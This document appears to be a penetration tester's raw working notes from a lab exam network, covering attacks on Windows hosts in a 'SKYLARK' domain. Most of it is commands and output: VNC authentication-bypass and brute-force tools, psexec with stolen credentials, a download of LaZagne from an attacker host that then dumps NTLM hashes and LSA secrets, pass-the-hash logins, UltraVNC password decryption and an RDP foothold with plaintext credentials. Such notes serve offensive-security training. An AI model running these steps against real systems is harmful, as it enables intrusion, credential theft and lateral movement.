feroxbuster -u http://192.168.154.220/ -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 



http://192.168.154.220:5985
HTTP Error 404. The requested resource is not found.

http://192.168.154.220:47001
HTTP Error 404. The requested resource is not found.


			VNC: 5900
https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc
https://www.hackingarticles.in/vnc-penetration-testing/

nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900 192.168.154.220
5900/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     Ultra (17)
|     Unknown security type (116)
|_    VNC Authentication (2)

# Connect to vnc using Kali
vncviewer -passwd passwd.txt 192.168.154.220::5900


			vnc-authentication-bypass.py
https://github.com/curesec/tools/blob/master/vnc/vnc-authentication-bypass.py

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/220]
â””â”€$ chmod +x vnc-authentication-bypass.py 

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/220]
â””â”€$ python2 vnc-authentication-bypass.py -u 192.168.154.220 -p 5900
Traceback (most recent call last):
  File "vnc-authentication-bypass.py", line 11, in <module>
    from Crypto.Cipher import DES
ImportError: No module named Crypto.Cipher


https://pycryptodome.readthedocs.io/en/latest/src/cipher/des.html

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/220]
â””â”€$ pip3 install pycryptodome

Defaulting to user installation because normal site-packages is not writeable
Collecting pycryptodome
  Using cached pycryptodome-3.20.0-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Using cached pycryptodome-3.20.0-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
Installing collected packages: pycryptodome
Successfully installed pycryptodome-3.20.0

https://github.com/pycrypto/pycrypto/blob/master/lib/Crypto/Cipher/DES.py

from Crypto.Cipher import DES

			vnc-brute-forcer.py
https://github.com/curesec/tools/blob/master/vnc/vnc-brute-forcer.py

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/220]
â””â”€$ chmod +x vnc-brute-forcer.py     


			240: houston01 - Pwn3d!
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-psexec backup_service:It4Server@10.10.209.240 cmd.exe

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
houston01

PS C:\Windows\system32> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\
Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        5/17/2024  12:17 AM             34 local.txt          
                                                   
PS C:\Windows\system32> type C:\local.txt
53351d2ae32e40015c2359f45ed797fc


PS C:\Windows\system32> Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\Administrator\Desktop
Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        5/17/2024  12:17 AM             34 proof.txt   

PS C:\Windows\system32> type C:\Users\Administrator\Desktop\proof.txt
de941d1bd5bb18016fff3d631c948dbd


			NETWORK: 
PS C:\> ipconfig /all
Windows IP Configuration
   Host Name . . . . . . . . . . . . : houston01
   Primary Dns Suffix  . . . . . . . : SKYLARK.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : SKYLARK.com
Ethernet adapter Ethernet1:
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-5E-23
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.168.240(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
   DNS Servers . . . . . . . . . . . : 10.10.168.250
   NetBIOS over Tcpip. . . . . . . . : Enabled
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-AB-8A-EC
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.208.220(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.208.254
   NetBIOS over Tcpip. . . . . . . . : Enabled

PS C:\> arp -A
Interface: 10.10.168.240 --- 0x7
  Internet Address      Physical Address      Type
  10.10.168.250         00-50-56-ab-f7-1b     dynamic   
  10.10.168.254         00-50-56-ab-b4-35     dynamic   
  10.10.168.255         ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
Interface: 192.168.208.220 --- 0xf
  Internet Address      Physical Address      Type
  192.168.50.254        00-50-56-ab-a4-bb     dynamic   
  192.168.208.254       00-50-56-ab-a4-bb     dynamic   
  192.168.208.255       ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static   


			CREDS: 
impacket-psexec backup_service:It4Server@10.10.168.240 cmd.exe
evil-winrm -i 10.10.168.240 -u backup_service -p It4Server

# LaZagne: 
iwr -uri http://192.168.45.192:80/LaZagne.exe -Outfile laz.exe
*Evil-WinRM* PS C:\Users\Public\Downloads> .\laz.exe all
[+] System masterkey decrypted for 577a5e59-40c3-4274-a335-77a9505a2299
[+] System masterkey decrypted for a4488b73-ed57-4ce1-aa50-e705989021f8
[+] System masterkey decrypted for f27b0506-d17a-4e50-8370-4762363e9f05
[+] System masterkey decrypted for fc6d64e7-eee5-4333-a718-45f84d71d2ef
########## User: SYSTEM ##########
------------------- Hashdump passwords -----------------
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3493ca95f39c3ff1df9bd02086180591:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8a6eaf08f1254eabb2838d91188596ed:::
------------------- Pypykatz passwords -----------------
[+] Shahash found !!!
Shahash: 405e0c8199d8bb478fd4b9f41fc14dc0e7f8e104
Nthash: 3493ca95f39c3ff1df9bd02086180591
Login: Administrator
[+] Shahash found !!!
Shahash: 08e109702a1404f4b2ed041e3154be1fe368c1a4
Nthash: 4216e797f88dc86ffe9818184b5ea234
Login: HOUSTON01$
------------------- Lsa_secrets passwords -----------------
$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   A7 3B 33 CD DF 45 C4 17 FD 41 16 0D 35 CE 50 6A    .;3..E...A..5.Pj
0020   5C 63 4E 18 3F 2E 91 AF 1B C0 C6 1B 47 78 64 7B    .cN.?.......Gxd{
0030   DB 44 D0 59 A3 1A 1E E0 B6 EE E8 10 9E 51 82 5B    .D.Y.........Q.[
0040   A4 0F 81 DA B5 63 A8 F0 1C DE F7 6A 6C 80 EF A6    .....c.....jl...
0050   2D 3F ED 94 E6 9D 1A 95 35 97 30 B1 33 A2 5A D7    -?......5.0.3.Z.
0060   65 E6 B7 CA 9D 79 D1 1C F5 F0 E5 B4 F7 A7 AA D9    e....y..........
0070   7F F3 FF 48 A3 D6 37 E6 6E E7 A3 24 04 E0 9B 93    ...H..7.n..$....
0080   D4 AE E2 AB 8C 9F E3 F2 80 96 85 CC 01 C8 36 F8    ..............6.
0090   96 A5 F2 C0 E6 25 34 4A 2F 1E D6 5F 6A 16 09 86    .....%4J/.._j...
00A0   7A 1B 4D F6 7B 24 C3 C1 A9 6C 7E C3 DF 8D E1 04    z.M.{$...l~.....
00B0   D5 FB 59 1A F7 6D 37 FF B3 DF 17 80 F1 BB B7 F4    ..Y..m7.........
00C0   FA BE 4E 98 36 92 D3 C1 E8 F3 63 0A 5D 5C 95 29    ..N.6.....c.]..)
00D0   DC 69 23 55 43 9C 20 99 BC D4 BC AB 11 F9 69 B3    .i#UC. .......i.
00E0   0F F0 80 A8 31 04 F5 56 4E E5 12 1D FA 92 DF 31    ....1..VN......1
00F0   B4 05 4A 84 5A B5 C7 86 17 8F 6F 10 36 AF F7 1A    ..J.Z.....o.6...
0100   4D 1B A7 3D 61 52 59 81 EE D9 8C D0 E6 39 EF A9    M..=aRY......9..
DefaultPassword
0000   22 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    "...............
0010   41 00 70 00 6F 00 6C 00 6C 00 6F 00 4D 00 69 00    A.p.o.l.l.o.M.i.
0020   73 00 73 00 69 00 6F 00 6E 00 31 00 39 00 38 00    s.s.i.o.n.1.9.8.
0030   37 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    7...............
DPAPI_SYSTEM
0000   01 00 00 00 88 0F FE DB 3B E0 D6 78 2F 0E 3B B9    ........;..x/.;.
0010   BA 3E 6B 78 C1 4B 3D 14 3D 76 41 1B 7F F0 35 80    .>kx.K=.=vA...5.
0020   CC 36 99 A5 33 39 C3 3F 6F B3 F2 91                .6..39.?o...
NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   93 9A F5 B9 DB 1B CA B6 36 A6 8E 1B 41 D6 F6 BD    ........6...A...
0020   0F D8 6F 3E 19 C5 53 69 46 08 8F 68 84 9F 0E A8    ..o>..SiF..h....
0030   23 F5 F3 82 54 20 A7 F0 B3 26 2C 21 42 58 2B D7    #...T ...&,!BX+.
0040   53 F3 13 70 DB BC 56 6C 72 B6 22 1A CB CE C1 E6    S..p..Vlr.".....
0050   C7 F4 66 34 15 C0 0A C0 FC A2 2E 2A DE AB B2 FB    ..f4.......*....
[+] 405e0c8199d8bb478fd4b9f41fc14dc0e7f8e104 ok for masterkey 1e7d4e4a-9b4f-4f1b-ac63-944bf86c0c1a
[+] 405e0c8199d8bb478fd4b9f41fc14dc0e7f8e104 ok for masterkey c19a658a-149e-4a15-b700-158dabb92f6b
[+] 405e0c8199d8bb478fd4b9f41fc14dc0e7f8e104 ok for masterkey f963aa7a-51cd-4655-b876-c33f6eeb0694
[+] 2 passwords have been found.

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3493ca95f39c3ff1df9bd02086180591 Administrator@10.10.168.240

evil-winrm -i 10.10.168.240 -u Administrator -H 3493ca95f39c3ff1df9bd02086180591

#Powershell password hunting:
PS C:\Windows\system32> (Get-PSReadlineOption).HistorySavePath

*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
shutdown /r /t 7

			FILES OF INTEREST: 
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force
Get-ChildItem -Path C:\ -Include *.zip -File -Recurse -ErrorAction SilentlyContinue -Force
Get-ChildItem -Path C:\ -Include *.cer -File -Recurse -ErrorAction SilentlyContinue -Force
Get-ChildItem -Path C:\ -Include *.ini -File -Recurse -ErrorAction SilentlyContinue -Force

*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem -Path C:\ -Include *.cer -File -Recurse -ErrorAction SilentlyContinue -Force
    Directory: C:\Program Files\uvnc bvba\UltraVNC
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/27/2020  10:05 PM           1294 ultravnc.cer

*Evil-WinRM* PS C:\Program Files\uvnc bvba\UltraVNC> cat ultravnc.ini
[ultravnc]
passwd=BFE825DE515A335BE3
passwd2=59A04800B111ADB060


			PasswordDecrypts: VNC 
DIDNT WORK: 
https://github.com/trinitronx/vncpasswd.py/blob/master/vncpasswd.py

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]
â””â”€$ git clone https://github.com/trinitronx/vncpasswd.py.git vncpasswd.py

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]
â””â”€$ cd vncpasswd.py

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/vncpasswd.py]
â””â”€$ python2 ./vncpasswd.py --help

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/vncpasswd.py]
â””â”€$ ./vncpasswd.py -d BFE825DE515A335BE3
WARN: Ciphertext length was not divisible by 8 (hex/16).
Length: 18
Hex Length: 36
Decrypted Bin Pass= '.b /  '
Decrypted Hex Pass= '2e0162920e2fb38b'

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/vncpasswd.py]
â””â”€$ ./vncpasswd.py -d 59A04800B111ADB060
WARN: Ciphertext length was not divisible by 8 (hex/16).
Length: 18
Hex Length: 36
Decrypted Bin Pass= '   `  I'
Decrypted Hex Pass= 'def7f360ed04b849'


WORKED:
https://github.com/frizb/PasswordDecrypts

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]
â””â”€$ echo -n BFE825DE515A335BE3 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
bad decrypt
40675FEA6A7F0000:error:1C80006B:Provider routines:ossl_cipher_generic_block_final:wrong final block length:../providers/implementations/ciphers/ciphercommon.c:443:
00000000  52 33 53 33 2b 72 63 48                           |R3S3+rcH|
00000008

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]
â””â”€$ echo -n 59A04800B111ADB060 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
bad decrypt
40E745CC6A7F0000:error:1C80006B:Provider routines:ossl_cipher_generic_block_final:wrong final block length:../providers/implementations/ciphers/ciphercommon.c:443:
00000000  41 42 43 44 45 46 47 48                           |ABCDEFGH|
00000008


-----------------------------------------------------------------------------------------
		192.168.154.221	Challenge 3 - VM 12 OS âœ…

RDP: 10000
HTTP: 80 443 3387 5985 47001
RPC: 135
SMB: 139 445
???: 4644 7964 8593 1370 1587 18462 27804 36070 38518 38690 42330 45854 64944 

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.221

HTTP: 80 443 3387 5985 47001
80/tcp    open     http          syn-ack     Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
443/tcp   open     ssl/http      syn-ack     Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=austin02.SKYLARK.com
| Issuer: commonName=austin02.SKYLARK.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-15T12:30:26
| Not valid after:  2023-05-17T12:30:26
| MD5:   01d0:9b4e:fc5d:353b:4411:4f3d:897b:e792
| SHA-1: 25c3:6186:4243:5f86:16b0:d0c7:190f:0105:d4fd:996b
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
3387/tcp  open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5985/tcp  open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

RDP: 10000
10000/tcp open     ms-wbt-server syn-ack     Microsoft Terminal Services
| ssl-cert: Subject: commonName=austin02.SKYLARK.com
| Issuer: commonName=austin02.SKYLARK.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-11T09:40:47
| Not valid after:  2024-10-11T09:40:47
| MD5:   5245:12fb:788d:df0a:7316:56e3:4da9:8cfc
| SHA-1: f008:528c:5f9a:4bca:8f2f:3e55:d31c:1b61:da6e:4014
|_ssl-date: 2024-05-14T02:46:49+00:00; -3s from scanner time.

???: 4644 7964 8593 1370 1587 18462 27804 36070 38518 38690 42330 45854 64944 
4644/tcp  filtered unknown       no-response
7964/tcp  filtered unknown       no-response
8593/tcp  filtered unknown       no-response
1370/tcp  filtered us-gv         no-response
1587/tcp  filtered pra_elmd      no-response
18462/tcp filtered unknown       no-response
27804/tcp filtered unknown       no-response
36070/tcp filtered unknown       no-response
38518/tcp filtered unknown       no-response
38690/tcp filtered unknown       no-response
42330/tcp filtered unknown       no-response
45854/tcp filtered unknown       no-response
64944/tcp filtered unknown       no-response

RPC: 135
135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
5504/tcp  open     msrpc         syn-ack     Microsoft Windows RPC
49664/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49665/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49666/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49668/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49670/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49671/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49672/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49673/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49674/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49675/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49678/tcp open     msrpc         syn-ack     Microsoft Windows RPC

SMB: 139 445
139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds  syn-ack     Windows Server 2022 Standard 20348 microsoft-ds
Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 34173/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 18284/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 56144/udp): CLEAN (Failed to receive data)
|   Check 4 (port 32717/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 1h44m57s, deviation: 3h30m00s, median: -3s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2022 Standard 20348 (Windows Server 2022 Standard 6.3)
|   Computer name: austin02
|   NetBIOS computer name: AUSTIN02\x00
|   Domain name: SKYLARK.com
|   Forest name: SKYLARK.com
|   FQDN: austin02.SKYLARK.com
|_  System time: 2024-05-13T19:46:19-07:00
| smb2-time: 
|   date: 2024-05-14T02:46:20
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 192.168.154.221
123/udp   open|filtered ntp
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
500/udp   open|filtered isakmp
4500/udp  open|filtered nat-t-ike
5353/udp  open|filtered zeroconf
5355/udp  open|filtered llmnr
6000/udp  open|filtered X11
10000/udp open|filtered ndmp
19541/udp open|filtered jcp
49205/udp open|filtered unknown
61370/udp open|filtered unknown
61412/udp open|filtered unknown


				RPC: 135
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ rpcclient -U '' -N 192.168.202.221
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED


				SMB: 139 445
impacket-smbclient kiosk@192.168.202.221

# shares
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

smbmap -H 192.168.202.221
smbmap -H 192.168.202.221 -u null

enum4linux -a 192.168.202.221
enum4linux -n 192.168.202.221
[+] Server 192.168.202.221 allows sessions using username '', password ''                         

smbclient -L ////192.168.202.221//
smbclient -U '' -P '' \\\\192.168.202.221\\

crackmapexec smb 192.168.202.221
SMB         192.168.202.221 445    AUSTIN02         [*] Windows Server 2022 Standard 20348 x64 (name:AUSTIN02) (domain:SKYLARK.com) (signing:False) (SMBv1:True)

crackmapexec smb 192.168.202.221 --shares -u "" -p ""
SMB         192.168.202.221 445    AUSTIN02         [*] Windows Server 2022 Standard 20348 x64 (name:AUSTIN02) (domain:SKYLARK.com) (signing:False) (SMBv1:True)
SMB         192.168.202.221 445    AUSTIN02         [+] SKYLARK.com\: 
SMB         192.168.202.221 445    AUSTIN02         [-] Error enumerating shares: STATUS_ACCESS_DENIED

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/221]
â””â”€$ impacket-psexec kiosk:XEwUS^9R2Gwt8O914@192.168.202.221 cmd.exe
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.202.221.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'Users' is not writable.

impacket-smbclient kiosk@192.168.202.221

# shares
ADMIN$
C$
IPC$
Users

# use ADMIN$
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

# use C$
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


			HTTP: 80 443 3387 5985 47001 
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/221]
â””â”€$ cat /etc/hosts  
192.168.202.221 SKYLARK.com

			http://skylark.com/
Microsoft IIS httpd 10.0

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ feroxbuster -u http://192.168.202.221 -v
200      GET      334l     2089w   180418c http://192.168.202.221/iisstart.png
200      GET       32l       55w      703c http://192.168.202.221/
301      GET        2l       10w      160c http://192.168.202.221/Aspnet_client => http://192.168.202.221/Aspnet_client/
301      GET        2l       10w      160c http://192.168.202.221/aspnet_Client => http://192.168.202.221/aspnet_Client/
301      GET        2l       10w      160c http://192.168.202.221/aspnet_client => http://192.168.202.221/aspnet_client/
301      GET        2l       10w      171c http://192.168.202.221/aspnet_client/system_web => http://192.168.202.221/aspnet_client/system_web/
301      GET        2l       10w      171c http://192.168.202.221/Aspnet_client/system_web => http://192.168.202.221/Aspnet_client/system_web/


â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ dirb http://192.168.202.221
---- Scanning URL: http://192.168.202.221/ ----
==> DIRECTORY: http://192.168.202.221/aspnet_client/                                              
                                                                                                  
---- Entering directory: http://192.168.202.221/aspnet_client/ ----
==> DIRECTORY: http://192.168.202.221/aspnet_client/system_web/                                   
                                                                                                  
---- Entering directory: http://192.168.202.221/aspnet_client/system_web/ ----

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo ifconfig tun0 mtu 1250


â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ wfuzz -c -u http://FUZZ.skylark.com -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 118
000000001:   301        6 L      10 W       134 Ch      "www"                            


				FOOTHOLD: RDP: 10000
		Using RD Web Access for resource monitoring: 
Browse to /RDWeb on the server and you will find the login window:
Log in using â€œSKYLARK\kioskâ€ as the username and â€œXEwUS^9R2Gwt8O914â€ as the
password.
Once logged in, start the â€œSkylarkStatusâ€ application. Please have this window open at all times
while making changes in the network. Notify the system administrators if the CPU goes beyond
80%.

kiosk:XEwUS^9R2Gwt8O914

xfreerdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /v:192.168.202.221:10000
xfreerdp /u:kiosk /v:austin02.SKYLARK.com:10000 /cert:ignore /p:"XEwUS^9R2Gwt8O914" /timeout:20000
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.202.221:10000 /u:kiosk /p:XEwUS^9R2Gwt8O914
xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /d:SKYLARK.com /u:kiosk


			QuickSessionCollection-CmsRdsh.rdp
https://www.studocu.com/en-ca/document/the-university-of-british-columbia/information-systems-technology-and-development/comm335-rds-quick-start/9394621
1. Start a Web browser (e.g. Safari, Chrome, and Firefox), and then visit the following Web site   
accordingly: 
/RDWeb

2. Logon to the server by entering your CWL (Campus Wide Login ) credentials with 
the â€œ.stuâ€ extension: 
â€œSKYLARK\kioskâ€ â€œXEwUS^9R2Gwt8O914â€ 

3. Double click â€œAccess 2016â€ to download the RDP file named â€œcpub-MSACCESS-   
QuickSessionCollection-CmsRdsh.rdpâ€.   

xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /d:SKYLARK /u:kiosk
XEwUS^9R2Gwt8O914

				HTTP: 80 /RDWeb

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/221]
â””â”€$ cat /etc/hosts  
192.168.202.221 SKYLARK.com

https://192.168.202.221/RDWeb/Pages/en-US/login.aspx?ReturnUrl=/RDWeb/Pages/en-US/Default.aspx

# Download: SkylarkStatus
https://192.168.202.221/RDWeb/Pages/en-US/Default.aspx
cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp


â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/221]
â””â”€$ cat /etc/hosts  
192.168.202.221 austin02.SKYLARK.com

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/221]
â””â”€$ xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /d:SKYLARK /u:kiosk
XEwUS^9R2Gwt8O914

local:
439b2e6811593bd16ee1c3d5d5b33085


				PRIV ESC: proof.txt
C:\Windows\System32\cmd.exe

C:\Users\kiosk\Documents>powershell -ep bypass

PS C:\Users\kiosk\Documents> whoami
skylark\kiosk

PS C:\Users\kiosk\Documents> hostname
austin02

PS C:\Users\kiosk\Documents> systeminfo
Host Name:                 AUSTIN02
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-10000-00001-AA620
Original Install Date:     11/14/2022, 9:19:35 AM
System Boot Time:          4/12/2024, 2:40:31 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC

PS C:\Users\kiosk\Documents> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


				# NETWORK
PS C:\Users\kiosk\Documents> ipconfig /all
Windows IP Configuration
   Host Name . . . . . . . . . . . . : austin02
   Primary Dns Suffix  . . . . . . . : SKYLARK.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : Yes
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : SKYLARK.com
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-C7-4F
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.202.221(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.202.254
   NetBIOS over Tcpip. . . . . . . . : Enabled
Ethernet adapter Ethernet1:
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-AB-D2-1B
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.162.254(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
   DNS Servers . . . . . . . . . . . : 10.10.162.250
   NetBIOS over Tcpip. . . . . . . . : Enabled


PS C:\Users\kiosk\Documents> route print
===========================================================================
Interface List
  3...00 50 56 ab c7 4f ......vmxnet3 Ethernet Adapter
  5...00 50 56 ab d2 1b ......vmxnet3 Ethernet Adapter #2
  1...........................Software Loopback Interface 1
===========================================================================
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.202.254  192.168.202.221     16
      10.10.162.0    255.255.255.0         On-link     10.10.162.254    271
    10.10.162.254  255.255.255.255         On-link     10.10.162.254    271
    10.10.162.255  255.255.255.255         On-link     10.10.162.254    271
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.202.0    255.255.255.0         On-link   192.168.202.221    271
